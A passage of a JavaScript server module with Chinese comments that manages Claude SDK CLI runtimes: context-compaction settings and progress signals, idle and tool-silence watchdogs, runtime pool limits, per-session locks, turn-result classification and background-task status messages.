 * 把自动压缩的旋钮(以及跨会话拒收)写进 `options.settings`。常驻路径与一次性路径(定时任务、外部 Agent API、
 * 常驻失败后的回退)共用,`PRISM_AUTO_COMPACT` / `PRISM_AUTO_COMPACT_WINDOW` 才是部署级的。
 *
 * 这两个字段属于 `Settings` 而不是 `Options`,必须走 `options.settings`;直接写 `sdkOptions.autoCompactEnabled`
 * 会被 SDK 静默忽略。
 *
 *   sdk.d.ts  autoCompactWindow?: number    → interface Settings
 *   sdk.d.ts  autoCompactEnabled?: boolean  → interface Settings
 *   sdk.d.ts  settings?: string | Settings  → type Options   ← 入口在这
 *
 * `settings` 是 flag 层,优先级在 user/project/local 之上、managed policy 之下,正是运维旋钮该在的位置。
 * `settings-shape.test.js` 钉住这几条。
 */
function applyCompactSettings(sdkOptions, { contextWindow = null } = {}) {
  const compactSettings = {};
  if (!AUTO_COMPACT_ENABLED) compactSettings.autoCompactEnabled = false;
  /*
   * 窗口 = min(模型目录里这个模型的窗口, PRISM_AUTO_COMPACT_WINDOW),两者有其一就写。
   * `CLAUDE_CODE_MAX_CONTEXT_TOKENS` 对 `claude-*` 型号名不生效,要靠这一项把窗口压到网关的真实上限。
   */
  const windows = [contextWindow, AUTO_COMPACT_WINDOW].filter((value) => Number.isFinite(value) && value > 0);
  if (windows.length > 0) compactSettings.autoCompactWindow = Math.min(...windows);
  // 无条件带上 `crossSessionInbound`:本会话拒收别的会话投来的消息。
  compactSettings.crossSessionInbound = CROSS_SESSION_INBOUND;
  // 已经有 settings 就合并;是路径字符串(string | Settings)就不动它,只警告:
  // 悄悄把指定的 settings 文件换成对象,比旋钮失效更糟。
  if (typeof sdkOptions.settings === 'string') {
    log.warn('[Claude SDK] options.settings 是路径字符串,自动压缩旋钮与跨会话拒收这次不生效:', sdkOptions.settings);
  } else {
    sdkOptions.settings = { ...(sdkOptions.settings || {}), ...compactSettings };
  }
  return sdkOptions;
}
/**
 * 常驻运行时上限,针对整台服务器而不是每人。
 *
 * 一个常驻运行时就是一个 Claude SDK 进程。到顶之后 `enforceRuntimeLimit` 先淘汰空闲的,淘不动就让这一轮失败;
 * 被挤掉的人下一轮要重建、变慢。默认 20 按多人日常并发定;内存是主要成本(每个进程的占用随上下文长度增长),
 * 内存紧张时用 PRISM_MAX_RUNTIMES 往下调。
 */
const MAX_RUNTIMES = parseInt(process.env.PRISM_MAX_RUNTIMES, 10) || 20;
const IDLE_RUNTIME_MS = parseInt(process.env.PRISM_RUNTIME_IDLE_MS, 10) || 30 * 60 * 1000;
const CONTEXT_USAGE_TIMEOUT_MS = 5000;

/**
 * 压缩心跳的最小间隔。
 *
 * 压缩是一次模型调用,没有完成度可言,任何百分比都是编的;能如实给出的只有:还在跑吗、跑多久了、正不正常。
 * 心跳负责第一件:它只在 CLI 真的往流里吐东西时才跳,CLI 一停它也停,这正是「卡住了没有」的判据,
 * 定时动画做不到这一点(真卡住时它照转不误)。
 */
const COMPACTION_BEAT_MIN_INTERVAL_MS = 1500;

/**
 * CLI 报的 `compact_result: 'failed'` 不全是失败。
 *
 * CLI 自己的错误通知也分两类:对话太短(`Not enough messages to compact.`)和用户中止
 * (`API Error: Request was aborted.`)不弹错误通知,前者没什么可压,后者是用户自己按的停止;其余才是真失败。
 * 这里沿用同一规则:判成 noop / aborted 的,界面上不说「压缩失败,下一轮将带着未压缩的上下文继续」。
 * `Compaction canceled` 是 PreCompact hook 拦下压缩时读循环补的收尾原因,同样按 aborted 处理。
 */
export function classifyCompactError(error) {
  const text = typeof error === 'string' ? error : String(error?.message ?? error ?? '');
  if (text.includes('Not enough messages to compact')) return 'noop';
  if (text.includes('Request was aborted') || text.includes('Compaction canceled')) return 'aborted';
  return 'failed';
}

/**
 * 用户手打的 `/compact`。
 *
 * 它不走 `/api/commands/execute`(那里只认内置命令和带 path 的自定义命令):前端把 CLI 自带的斜杠命令当提示词
 * 直接发给 CLI,所以它就是一个普通回合。认出来是为了两件事:进度条按回车就点亮(不用等 CLI 的 status 帧),
 * 以及把 trigger 标成 manual 而不是 auto。
 */
export function isCompactCommand(command) {
  return typeof command === 'string' && /^\/compact(\s|$)/.test(command.trimStart());
}

/**
 * 一次压缩的对外信号,各阶段都来自 CLI 自己发的帧:
 *   running —— `system/status status:'compacting'`、compact_boundary,或用户手打 `/compact` 时立即点亮
 *   done    —— `compact_result:'success'` 或 compact_boundary(带 pre/post/duration)
 *   failed  —— `compact_result:'failed'` + `compact_error`
 *   skipped —— 没压或被中止(见 classifyCompactError),不报失败
 *
 * `blocking` 表示这次压缩是否占用户的等待时间;压缩都发生在用户回合内部,目前恒为 true。
 */
function createCompactionStatus(sessionId, compaction) {
  return createNormalizedMessage({
    kind: 'status',
    // 文案由前端按 statusKind + compaction.phase 本地化,这里只留英文兜底。
    text: compaction.phase === 'failed' ? 'Compaction failed' : 'Compacting context…',
    statusKind: 'compacting',
    compaction,
    canInterrupt: false,
    sessionId: sessionId || null,
    provider: 'claude',
  });
}

/** 记下上次压缩的耗时:「上次用了 38 秒」是唯一如实的进度参照。 */
function rememberCompactionDuration(runtime, durationMs) {
  if (!runtime || !Number.isFinite(durationMs) || durationMs <= 0) return;
  runtime.lastCompactionMs = Math.round(durationMs);
}

/**
 * 把这一回合标成「正在压缩」,并向界面推一帧。`trigger` 记谁发起的:manual 是用户手打的 `/compact`,
 * auto 是 CLI 自己触发的。
 */
function beginCompaction(runtime, turn, { trigger, blocking }) {
  if (!turn || turn.compaction) return;
  turn.compaction = {
    trigger, blocking, startedAtMs: Date.now(), beat: 0, lastBeatAtMs: 0,
    stallAfterMs: stallThresholdFor(turn),
  };
  // 压缩阶段用自己的(更短的)静默上限,立即切换。
  if (runtime?.turn === turn) armIdleWatchdog(runtime, turn);
  turn.ws?.send(createCompactionStatus(runtime.sessionId, {
    phase: 'running',
    trigger,
    blocking,
    beat: 0,
    elapsedMs: 0,
    stallAfterMs: turn.compaction.stallAfterMs,
    lastDurationMs: runtime.lastCompactionMs ?? null,
  }));
}

/**
 * 压缩时「CLI 没有响应」该在多久之后提示。
 *
 * 跟着静默上限走,不写死:在上限的一半时先提示,早于系统自己动手,晚于正常的首字延迟。写死一个小数字
 * 会在每次大上下文压缩时误报:从推入 `/compact` 到流上第一个 token,中间隔着一次超长 prompt 的模型往返。
 */
function stallThresholdFor(turn) {
  const idleMs = turn?.watchdog?.idleMs;
  // 压缩阶段的上限取 min(回合 idle, COMPACTION_IDLE_TIMEOUT_MS);都没有时固定 45 秒。
  const effectiveIdle = Number.isFinite(idleMs) && idleMs > 0
    ? (COMPACTION_IDLE_TIMEOUT_MS > 0 ? Math.min(idleMs, COMPACTION_IDLE_TIMEOUT_MS) : idleMs)
    : (COMPACTION_IDLE_TIMEOUT_MS > 0 ? COMPACTION_IDLE_TIMEOUT_MS : 0);
  if (effectiveIdle <= 0) return 45_000;
  return Math.max(15_000, Math.round(effectiveIdle / 2));
}

/**
 * 收尾:成败、pre/post、耗时一起发出去,并记住耗时供下次参照。
 *
 * 「没压」和「压失败」是两件事(见 classifyCompactError):对话太短、
 * 用户中止都归到 `skipped`,不报失败 —— CLI 自己也不把这两种当错误。
 * 只有真失败才提醒"下一轮将带着未压缩的上下文继续"。
 */
function endCompaction(runtime, turn, { ok, error }) {
  if (!turn?.compaction) return;
  const state = turn.compaction;
  turn.compaction = null;
  // 压过之后下一次读用量要读完整版:压缩后、下一次模型调用前,摘要里还是压缩前的数。
  if (ok && runtime) runtime.compactedSinceUsageRead = true;
  // status 帧先收尾时,CLI 随后还会吐一帧 compact_boundary;记下来,让边界帧只补日志、不再把压缩态重新点亮(见读循环)。
  turn.compactionAwaitingBoundary = true;
  // 压缩结束,静默看门狗恢复用户回合的预算(回合本身已结束时调用方紧接着 clearTurnTimers,这里武装的计时器会被一并撤掉)。
  if (runtime?.turn === turn) armIdleWatchdog(runtime, turn);
  const durationMs = state.durationMs ?? (Date.now() - state.startedAtMs);
  const kind = ok ? 'ok' : classifyCompactError(error);
  // 没真压的那几种不更新「上次用时」:拿一次空操作当参照,下次「比平常久」就判不准了。
  if (kind === 'ok') rememberCompactionDuration(runtime, durationMs);
  turn.ws?.send(createCompactionStatus(runtime.sessionId, {
    phase: kind === 'ok' ? 'done' : kind === 'failed' ? 'failed' : 'skipped',
    skipReason: kind === 'noop' ? 'too-short' : kind === 'aborted' ? 'aborted' : undefined,
    trigger: state.trigger,
    blocking: state.blocking,
    preTokens: state.preTokens ?? null,
    postTokens: state.postTokens ?? null,
    durationMs: Math.round(durationMs),
    error: kind === 'failed' ? (error || null) : null,
  }));
}

/**
 * 压缩心跳:只在 CLI 真的往流里推东西时跳一下(按最小间隔节流),是界面上证明「它还活着」的依据。
 */
function beatCompaction(runtime, turn) {
  const state = turn?.compaction;
  if (!state) return;
  const now = Date.now();
  if (now - state.lastBeatAtMs < COMPACTION_BEAT_MIN_INTERVAL_MS) return;
  state.lastBeatAtMs = now;
  state.beat += 1;
  turn.ws?.send(createCompactionStatus(runtime.sessionId, {
    phase: 'running',
    trigger: state.trigger,
    blocking: state.blocking,
    beat: state.beat,
    // 耗时由服务端算:它知道压缩真正的起点。客户端自己计时的话,断线重连
    // (或换个标签页看)会从 0 重新起算,「比平常久」就永远判不出来了。
    elapsedMs: now - state.startedAtMs,
    stallAfterMs: state.stallAfterMs,
    lastDurationMs: runtime.lastCompactionMs ?? null,
  }));
}
/** Extra one-shot fallback slots beyond the resident pool (0 disables overflow). */
const MAX_ONESHOT_OVERFLOW = (() => {
  const parsed = parseInt(process.env.PRISM_MAX_ONESHOT_OVERFLOW, 10);
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : 2;
})();
/**
 * 回合看门狗配置(纯函数,单测钉住解析与默认值)。
 *   - idle(PRISM_TURN_IDLE_TIMEOUT_MS,默认 60 分钟,0 关):只看静默。流上有任何动静(增量文本 / 工具事件 /
 *     状态)都续期;工具在途(已见 tool_use、未见对应 tool_result)期间不判死,CLI 自己的工具超时会给结果。
 *     不用墙钟上限,是为了不误杀长 SQL / 长构建这类在干活但超过一小时的回合;60 分钟对无工具的超长纯文本生成
 *     也几乎不会误伤,真卡死(网关在两步之间断流)最多一小时恢复。
 *   - absolute(PRISM_TURN_TIMEOUT_MS,默认 0 = 关):可选的硬上限。
 *   - toolSilenceMax(PRISM_TURN_TOOL_SILENCE_MAX_MS,默认 24 小时,0 关):工具在途豁免自己的硬顶。没有它,
 *     一条被遗忘的审批(tool_use 已发、没人点允许 / 拒绝)或一次丢失的 tool_result 会让 idle 看门狗无限续期,
 *     把 runtime 名额(PRISM_MAX_RUNTIMES)永久占住,而 idle reaper 只回收无 turn 的 runtime。
 *     24 小时远大于任何真实 SQL / 构建,又保证僵尸最多活一天。
 */
function readTurnWatchdogConfig(env = process.env) {
  const idleParsed = parseInt(env.PRISM_TURN_IDLE_TIMEOUT_MS, 10);
  const absoluteParsed = parseInt(env.PRISM_TURN_TIMEOUT_MS, 10);
  const toolSilenceParsed = parseInt(env.PRISM_TURN_TOOL_SILENCE_MAX_MS, 10);
  return {
    idleMs: Number.isFinite(idleParsed) && idleParsed >= 0 ? idleParsed : 60 * 60 * 1000,
    absoluteMs: Number.isFinite(absoluteParsed) && absoluteParsed >= 0 ? absoluteParsed : 0,
    toolSilenceMaxMs: Number.isFinite(toolSilenceParsed) && toolSilenceParsed >= 0
      ? toolSilenceParsed
      : 24 * 60 * 60 * 1000,
  };
}
const TURN_WATCHDOG = readTurnWatchdogConfig();

/**
 * 压缩阶段的静默上限,与用户回合的 idle 看门狗分开(默认 15 分钟,`PRISM_COMPACT_TIMEOUT_MS` 覆盖,0 关闭)。
 *
 * 压缩发生在用户回合内部。用户回合里跑一小时的 SQL 是正常的,但压缩是一次总结调用,正常几十秒,沿用回合的
 * 60 分钟预算会让卡住的压缩很久才被处理。所以只在 `turn.compaction` 亮着的那段收紧上限,压缩帧一到
 * (成功 / 失败 / 被拦)就恢复用户回合的预算。
 *
 * 常驻路径 `includePartialMessages = false`,CLI 压缩期间只在开始和结束各发一帧、没有保活帧,所以这个上限
 * 实际就是压缩总时长上限。默认不能太小:180k 上下文经网关压缩可能超过 5 分钟,上限一到 runtime 就销毁,
 * 下一条 resume 又压、又被砍,形成死循环。压缩不要挪回独立回合,见 AUTO_COMPACT_ENABLED 的说明。
 */
export function readCompactionIdleTimeout(env = process.env) {
  const parsed = parseInt(env.PRISM_COMPACT_TIMEOUT_MS, 10);
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : 15 * 60 * 1000;
}
const COMPACTION_IDLE_TIMEOUT_MS = readCompactionIdleTimeout();

/**
 * 这个 runtime 现在能不能接新活。
 *
 * 忙不忙以 CLI 的实际状态为准,不是以 Prism 自己的 `turn` 记账为准:回合结束不等于 CLI 闲下来了
 * (中止 / 超时收掉回合时,它起的 Bash 还在跑)。两者一分叉,往 runtime.input 里推的消息就会排在那个工具后面,
 * 既看不见也取消不掉。这是整条链路上唯一的「闲」的定义。
 */
export function runtimeIsIdle(runtime) {
  if (!runtime || runtime.disposed) return false;
  if (runtime.turn) return false;
  /**
   * CLI 自己发起的那一轮也算忙:后台子代理完成通知、会话内定时触发时,CLI 会在两个用户回合之间自己跑一轮,
   * 帧走无主路径(routeOrphanMessage)。那段时间 `turn` 是 null,`pendingToolUses` 也可能是空的(工具在子代理那张表里);
   * 若判成闲,名额淘汰 / 空闲回收 / 终端接管释放都会把它杀掉,那一轮的输出就此消失。
   */
  if (runtime.orphanTurnOpen) return false;
  /**
   * 后台任务在跑也算忙:主回合结束后只剩后台 Bash(`run_in_background`)在跑时 CLI 一帧不发,判成闲的话,
   * 空闲回收、名额淘汰、终端接管释放都会连进程带命令一起杀掉(后台命令默认 30 分钟、最长 2 小时,正好跨过回收线)。
   * 表来自 `system/background_tasks_changed`(全量替换,见 noteBackgroundTasks);不发这一帧的旧版 CLI 上表为空。
   */
  if ((runtime.liveBackgroundTasks?.size ?? 0) > 0) return false;
  return (runtime.pendingToolUses?.size ?? 0) === 0;
}

/** 后台任务表变化时的通知(按 appSessionId 推给界面),由组合根接线。 */
let backgroundTasksHook = null;
export function setBackgroundTasksHook(hook) {
  backgroundTasksHook = typeof hook === 'function' ? hook : null;
}

/**
 * 后台任务全量表:接 `system/background_tasks_changed`(SDK 0.3.203 起提供;REPLACE 语义)。
 * `ambient`(CLI 的杂活、live-update 监视器)不算:CLI 标明它们不计入活动指示。
 * 返回是否处理了这一帧。
 */
export function noteBackgroundTasks(runtime, message) {
  if (message?.type !== 'system' || message.subtype !== 'background_tasks_changed' || !Array.isArray(message.tasks)) return false;
  const live = new Map();
  for (const task of message.tasks) {
    if (!task || typeof task.task_id !== 'string' || !task.task_id || task.ambient === true) continue;
    live.set(task.task_id, {
      taskId: task.task_id,
      taskType: typeof task.task_type === 'string' ? task.task_type : 'task',
      description: typeof task.description === 'string' ? task.description : '',
    });
  }
  runtime.liveBackgroundTasks = live;
  if (backgroundTasksHook && runtime.appSessionId) {
    try {
      backgroundTasksHook({ appSessionId: runtime.appSessionId, tasks: [...live.values()] });
    } catch (error) {
      log.warn('[Claude SDK] background-tasks hook failed:', error?.message || error);
    }
  }
  return true;
}

/**
 * 从一条 SDK 流消息里提取工具调用的开始/结束(纯函数,供 idle 看门狗跟踪在途
 * 工具)。assistant 的 tool_use 记开始;user 的 tool_result 记结束。
 */
function collectToolUseDelta(message) {
  const adds = [];
  const removes = [];
  /**
   * 子代理的工具不算主 CLI 的在途。这张集合用来回答「这个 CLI 能不能接新活」(runtimeIsIdle / runtimeForSend
   * 的重建判据);子代理的 tool_use / tool_result 帧(带 `parent_tool_use_id`)若算进来,后台子代理跑着一条工具时
   * 用户一发消息,runtimeForSend 就会 dispose + resume,把整个 CLI 进程连同后台子代理一起杀掉,那张卡片从此
   * 永远转圈(task_notification 不会再来)。
   *
   * 子代理的在途另记一张表(runtime.subagentToolUses),只给观测回合的看门狗和空闲回收器判「还有没有东西在跑」,
   * 不参与能不能复用。
   */
  if (message?.parent_tool_use_id) return { adds, removes };
  const content = message?.message?.content;
  if (Array.isArray(content)) {
    for (const part of content) {
      if (!part || typeof part !== 'object') continue;
      if (part.type === 'tool_use' && typeof part.id === 'string') adds.push(part.id);
      if (part.type === 'tool_result' && typeof part.tool_use_id === 'string') removes.push(part.tool_use_id);
    }
  }
  return { adds, removes };
}

/** 子代理内部工具的开始 / 结束(带 parent_tool_use_id 的帧),只用于看门狗与空闲回收。 */
function collectSubagentToolUseDelta(message) {
  const adds = [];
  const removes = [];
  const parent = message?.parent_tool_use_id;
  if (!parent) return { adds, removes };
  const content = message?.message?.content;
  if (Array.isArray(content)) {
    for (const part of content) {
      if (!part || typeof part !== 'object') continue;
      if (part.type === 'tool_use' && typeof part.id === 'string') adds.push({ id: part.id, parent: String(parent) });
      if (part.type === 'tool_result' && typeof part.tool_use_id === 'string') removes.push(part.tool_use_id);
    }
  }
  return { adds, removes };
}

/**
 * 清理子代理的在途记录。
 *
 * 子代理跑到一半被中止时,它内部的 tool_use 不会有对应的 tool_result(CLI 只给顶层工具合成 interrupted 结果),
 * 表会永远非空,观测回合的看门狗就一直只续不杀。父任务收工(顶层 tool_result / task_notification)时清掉
 * 它名下的全部;中止时(parentToolUseId 为空)全清。
 */
function settleSubagentTools(runtime, parentToolUseId) {
  const table = runtime?.subagentToolUses;
  if (!(table instanceof Map)) return;
  if (!parentToolUseId) { table.clear(); return; }
  for (const [innerId, parent] of table) {
    if (parent === String(parentToolUseId)) table.delete(innerId);
  }
}

/** Resident runtimes keyed by provider-native session id (or pending:<uuid>). */
const claudeRuntimes = new Map();

/**
 * Live chat runs keyed by gateway runId (the app session id today). This is
 * what lets `chat.abort` reach a run BEFORE the provider-native session id
 * exists — the first turn of a new conversation only gets its native id
 * mid-stream, so the session-id abort route is a no-op until then.
 * Entry shape: { aborted, runtime, queryInstance, oneShotAbortController?, loopAbortController? }.
 */
const activeChatRuns = new Map();

/**
 * One-shot queries currently running through runOneShotFallback; together with the resident
 * pool they share the budget MAX_RUNTIMES + MAX_ONESHOT_OVERFLOW.
 */
let activeOneShotFallbacks = 0;

let runtimeMutationChain = Promise.resolve();
/**
 * 池子的全局锁:名额计算、淘汰与占位(见 createPersistentRuntime)在这里一个一个来。
 * 只包这几步,不包切模型、收尾等待这类慢操作,那些在每段对话自己的锁里做(见 withSessionLock)。
 */
function withRuntimeMutation(fn) {
  const next = runtimeMutationChain.then(fn, fn);
  runtimeMutationChain = next.then(() => undefined, () => undefined);
  return next;
}

/** 已过名额检查、还没登记进 claudeRuntimes 的 runtime 个数(起进程那段 await 在全局锁外)。 */
let reservedRuntimeSlots = 0;

/**
 * 每段对话一把锁(键是 provider 会话 id;新会话每次一个 `pending:` 键,彼此不排队)。
 *
 * 同一段对话的发送必须串行:收尾等待、切档 / 换模型 / 改档位、重建都在这把锁里。不同对话互不等待:
 * 切模型前 CLI 要向网关确认一句,网关慢或 429 时一个控制请求就是 10 秒,放在全局锁里会让所有人的发送
 * 一起排在后面。锁里拿着的 runtime 盖着预占标记(claimedAt),别的对话起进程时的名额淘汰不会挑中它。
 */
const sessionLocks = new Map();
function withSessionLock(lockKey, fn) {
  const previous = sessionLocks.get(lockKey) ?? Promise.resolve();
  const run = previous.then(fn, fn);
  const tail = run.then(() => undefined, () => undefined);
  sessionLocks.set(lockKey, tail);
  tail.then(() => {
    if (sessionLocks.get(lockKey) === tail) sessionLocks.delete(lockKey);
  });
  return run;
}

/** Minimal async queue implementing the SDK's streaming-input protocol. */
function createInputQueue() {
  const values = [];
  const waiters = [];
  let closed = false;
  return {
    push(value) {
      if (closed) throw new Error('runtime input is closed');
      const waiter = waiters.shift();
      if (waiter) waiter({ value, done: false });
      else values.push(value);
    },
    close() {
      if (closed) return;
      closed = true;
      while (waiters.length) waiters.shift()({ value: undefined, done: true });
    },
    async next() {
      if (values.length) return { value: values.shift(), done: false };
      if (closed) return { value: undefined, done: true };
      return new Promise((resolveNext) => waiters.push(resolveNext));
    },
    [Symbol.asyncIterator]() { return this; },
  };
}

function isTurnResult(message) {
  return message?.type === 'result' && !message?.parent_tool_use_id;
}

/**
 * 这条 result 是不是 CLI 自己那一轮的收尾(而不是本回合的)。
 * push 时 CLI 的一轮开着,且本回合还没收到过任何一帧,那它只可能是 CLI 那一轮的。
 */
export function shouldIgnoreForeignResult(turn) {
  return Boolean(turn?.expectForeignResult) && !turn?.sawFrame;
}

/**
 * CLI 从这个版本起在 result 上回显 `user_message_uuid(s)`(SDK 0.3.259 / CLI 2.1.259)。
 * `CLAUDE_CLI_PATH` 指到更老的全局 CLI 时,result 没带 uuid 不能当成「不是本回合的」。
 */
const UUID_ECHO_MIN_CLI = [2, 1, 259];
export function cliEchoesUserMessageUuid(version) {
  if (typeof version !== 'string') return false;
  const parts = version.trim().split(/[.\s-]/).slice(0, 3).map((part) => Number.parseInt(part, 10));
  if (parts.length < 3 || parts.some((part) => !Number.isFinite(part))) return false;
  for (let index = 0; index < 3; index += 1) {
    if (parts[index] !== UUID_ECHO_MIN_CLI[index]) return parts[index] > UUID_ECHO_MIN_CLI[index];
  }
  return true;
}

/**
 * 这条顶层 result 是不是本回合的。
 *
 * 多个后台任务完成时,CLI 会自己跑一轮、发出 `num_turns: 0` 的空 result(SDK 0.3.274 起)。它若在用户回合中途到达
 * 并被当成本回合的收尾,用户回合会被提前收掉,真正的回答随后成了无主帧。shouldIgnoreForeignResult 只管
 * 「本回合还没收到任何帧」的情形,这里按 uuid 判。
 *
 * 判据(普通回合与 `/context` `/cost` `/compact` 这类本地命令的 result 都会原样回显我们推进去的 uuid):
 * - 带了 uuid:含本回合发出的任何一个 → `own`;一个都不含 → `foreign`;
 * - 没带 uuid 且 CLI 会回显:只有「空的成功结果」(`num_turns === 0`、不是本地命令)判 `foreign`,
 *   本回合自己的 result 一定带 uuid;出错的、有轮次的一律 `unknown`(崩溃这类 session 级失败不带 uuid,
 *   却必须收掉用户回合);
 * - 其余 `unknown`,交给既有判据。
 *
 * @returns {'own' | 'foreign' | 'unknown'}
 */
export function classifyTurnResult(turn, message, { uuidEcho = false } = {}) {
  const echoed = [];
  if (typeof message?.user_message_uuid === 'string' && message.user_message_uuid) echoed.push(message.user_message_uuid);
  if (Array.isArray(message?.user_message_uuids)) {
    for (const id of message.user_message_uuids) if (typeof id === 'string' && id) echoed.push(id);
  }
  const mine = turn?.userMessageUuids;
  const haveMine = mine instanceof Set && mine.size > 0;
  if (echoed.length > 0 && haveMine) {
    return echoed.some((id) => mine.has(id)) ? 'own' : 'foreign';
  }
  if (!uuidEcho || !haveMine || echoed.length > 0) return 'unknown';
  const emptySuccess = message?.subtype === 'success'
    && !message?.is_error
    && Number(message?.num_turns) === 0
    && !message?.local_command;
  return emptySuccess ? 'foreign' : 'unknown';
}

/**
 * 记下 CLI 的版本与能力位;版本与关键工具的日志每个持有者(runtime / 一次性进程)只打一行。
 *
 * `system/init` 每个回合都会来一次(resume 出来的会话也一样),所以「已打印」要记在持有者上;
 * 不能挂在抓 session_id 的地方,resume 的会话走不到那里。
 */
function noteCliInit(holder, message, label) {
  if (!holder || message?.type !== 'system' || message?.subtype !== 'init') return;
  if (typeof message.claude_code_version === 'string' && message.claude_code_version) {
    holder.cliVersion = message.claude_code_version;
  }
  /**
   * 能力位按 init 的 `capabilities` 判,不比版本号(如 `interrupt_receipt_v1` / `interrupt_cancel_queued_v1` /
   * `msg_lifecycle_v1` / `mcp_read_resource_v1` / `mcp_tool_ui_meta_v1`)。旧版 CLI(`CLAUDE_CLI_PATH=claude`
   * 退回全局安装)没有这个字段,得到空集合,用到它的地方(停止时撤回合流消息)自然降级。
   */
  if (Array.isArray(message.capabilities)) {
    holder.cliCapabilities = new Set(message.capabilities.filter((entry) => typeof entry === 'string'));
  }
  if (holder.cliInitLogged) return;
  holder.cliInitLogged = true;
  const tools = Array.isArray(message.tools) ? message.tools : [];
  const has = (name) => tools.includes(name);
  const crossSession = CROSS_SESSION_TOOLS.filter(has);
  log.info(
    `[Claude SDK] ${label} CLI ${message.claude_code_version || '?'} · 模型 ${message.model || '?'}`
    + ` · 工具 ${tools.length} 个`
    + ` · SendMessage/ListAgents=${crossSession.length === 0 ? '禁' : `在(${crossSession.join('/')})`}`
    + ` · TaskCreate=${has('TaskCreate') ? '在' : '缺'}`
    + ` · 权限档 ${message.permissionMode || '?'}`
    + ` · 能力位 ${Array.isArray(message.capabilities) && message.capabilities.length ? message.capabilities.join('/') : '无'}`
  );
  if (crossSession.length > 0) {
    log.warn(`[Claude SDK] ${label} 的工具清单里仍有 ${crossSession.join(' / ')} —— 跨会话消息没被禁掉,查 disallowedTools`);
  }
}

/**
 * 中止之后,第一个 result 必须结束用户回合,不管它是谁的。
 *
 * 用户在 CLI 自己那轮还开着时发了消息(expectForeignResult = true)随即按停止:interrupt 让 CLI 收掉自己那轮、
 * 发出 result。若仍按外来的忽略,用户回合就永远等不到自己的 result(CLI 要么把排队的消息接着跑、帧全被丢,
 * 要么丢掉它、回合挂到看门狗),期间每次发送都撞 "A turn is already running"。
 */
function disarmForeignResultGuard(runtime) {
  if (runtime?.turn) runtime.turn.expectForeignResult = false;
  // 中止即子代理也停了,它们内部的工具不会再有结果(见 settleSubagentTools)。
  settleSubagentTools(runtime, null);
}

/* ── CLI 自己发起的那一轮 ─────────────────────────────────────────── */

/**
 * 无主帧的去向。由组合根注入:本模块不依赖 websocket 层(与 `setRuntimeEvictionNotifier` 同一套写法)。
 * `null` = 没接线,只计数、丢弃。
 */
let orphanTurnHook = null;

export function setOrphanTurnHook(hook) {
  orphanTurnHook = typeof hook === 'function' ? hook : null;
}

/** 无主帧计数(收到的帧数 / 已交给观测回合的轮数),让「丢了一整轮」在日志里可见。 */
const orphanStats = { frames: 0, observed: 0, lastWarnAt: 0 };
const ORPHAN_WARN_INTERVAL_MS = 30_000;

export function getOrphanFrameStats() {
  return { frames: orphanStats.frames, observed: orphanStats.observed };
}

/** 有内容的帧才值得记账 —— 纯心跳/控制帧不算"丢了东西"。 */
function isContentfulFrame(message) {
  const type = message?.type;
  return type === 'user' || type === 'assistant' || type === 'result'
    || type === 'content_block_delta' || type === 'content_block_stop';
}

/**
 * SDK 的任务生命周期帧 → Prism 的显示行。
 *
 * SDK 把后台任务做成了结构化消息(`type:'system'` 的 `task_started` / `task_progress` / `task_updated` /
 * `task_notification`),带 `task_id` / `status` / `summary` / `output_file` / `usage`。这里接三种:
 *
 * - `task_notification`:完成 / 失败 / 被停;
 * - `task_started`:只在没有 `tool_use_id` 时画。带 tool_use_id 的是 Task 子代理,子代理卡(来自 tool_use 帧)
 *   已经在画它,再画一行就重复了;
 * - `task_progress`:只在带 `tool_use_id` 时接,落成不进 durable 白名单的 `task_progress` kind:它每几秒一条,
 *   做成 durable 行等于把洪流灌进显示日志;带 id 才有卡可归,不带就是主流里的噪音。
 *
 * `task_updated` 不接:那是要前端维护任务表来合并的 patch,属于后台任务面板。
 */
export function taskLifecycleMessage(message, sessionId) {
  if (message?.type !== 'system') return null;
  const subtype = message.subtype;
  if (subtype !== 'task_notification' && subtype !== 'task_started' && subtype !== 'task_progress') return null;
  // CLI 明说了"别放进 transcript"(环境自查之类的杂活),照办。
  if (message.skip_transcript === true) return null;

  if (subtype === 'task_started') {
    if (message.tool_use_id) return null;   // 子代理卡已经在画它了
    const what = String(message.description || message.workflow_name || '后台任务').trim();
    const summary = `🚀 后台任务已启动:${what}`;
    return createNormalizedMessage({
      id: `task_${message.task_id || generateMessageId('task')}_started`,
      sessionId,
      provider: 'claude',
      kind: 'task_notification',
      status: 'running',
      summary,
      content: summary,
    });
  }

  /**
   * 进展只归卡片,不进主对话流,也不落库。
   *
   * 任务一转后台,那次工具调用立刻拿到「running in the background」的 tool_result,子代理卡当场收工,
   * 停在转后台之前跑到的那几步;之后的进展只存在于 `task_progress` 里。
   * 没有 `tool_use_id` 就没有卡片可归(转后台的 Bash、workflow),直接丢掉:每几秒一条,在主对话流里只是噪音。
   */
  if (subtype === 'task_progress') {
    if (!message.tool_use_id) return null;
    const usage = message.usage || {};
    return createNormalizedMessage({
      // 同一个任务的进展用同一个 id:直播路径按 id upsert,不会堆出一串。
      id: `taskprog_${message.task_id || message.tool_use_id}`,
      sessionId,
      provider: 'claude',
      kind: 'task_progress',
      status: 'running',
      toolId: String(message.tool_use_id),
      taskId: message.task_id ? String(message.task_id) : undefined,
      summary: String(message.summary || message.description || '').trim() || undefined,
      taskProgress: {
        toolUses: Number.isFinite(Number(usage.tool_uses)) ? Number(usage.tool_uses) : undefined,
        totalTokens: Number.isFinite(Number(usage.total_tokens)) ? Number(usage.total_tokens) : undefined,
        durationMs: Number.isFinite(Number(usage.duration_ms)) ? Number(usage.duration_ms) : undefined,
        lastToolName: message.last_tool_name ? String(message.last_tool_name) : undefined,
        subagentType: message.subagent_type ? String(message.subagent_type) : undefined,
      },
    });
  }

  const status = message.status === 'completed' ? 'completed' : 'failed';
  const head = message.status === 'completed'
    ? '✅ 后台任务完成'
    : message.status === 'stopped'
      ? '⏹ 后台任务已停止'
      : '⚠️ 后台任务失败';
  const detail = String(message.summary || '').trim();
  const usage = message.usage && Number.isFinite(Number(message.usage.duration_ms))
    ? ` · 耗时 ${Math.max(1, Math.round(Number(message.usage.duration_ms) / 1000))}s`
      + (Number.isFinite(Number(message.usage.tool_uses)) ? ` · ${message.usage.tool_uses} 次工具` : '')
    : '';
  /**
   * `summary` 只有一行(✅/⚠️ + 耗时 + 次数),前端拿它当卡片的后台状态;`content` 装全文,进显示日志、进 transcript。
   * 两者若是同一个多行大块,子代理卡展开后会顶出一大段没排版的长文。
   */
  const summary = `${head}${usage}`;
  const content = detail ? `${summary}\n\n${detail}` : summary;
  return createNormalizedMessage({
